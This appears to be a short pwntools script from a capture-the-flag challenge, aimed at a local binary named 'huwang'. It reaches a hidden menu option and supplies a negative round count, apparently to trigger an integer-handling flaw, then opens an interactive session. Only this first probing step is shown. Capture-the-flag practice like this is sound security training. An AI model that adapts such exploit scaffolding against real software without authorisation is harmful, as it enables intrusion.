from pwn import *

context.log_level = 'debug'

p = process("./huwang")

def six(name,rounds,secret):
	p.recvuntil("command>>")
	p.sendline("666")
	p.recvuntil("please input your name")
	p.sendline(name)
	p.recvuntil("Do you want to guess the secret?")
	p.sendline("y")
	p.recvuntil("Input how many rounds do you want to encrypt the secret:")
	p.sendline(str(rounds))
	p.recvuntil("Try to guess the md5 of the secret")
	p.sendline(secret)
 
if __name__=='__main__':

	six("hello",-1,"deadbeef")

	#gdb.attach(p)

	p.interactive()
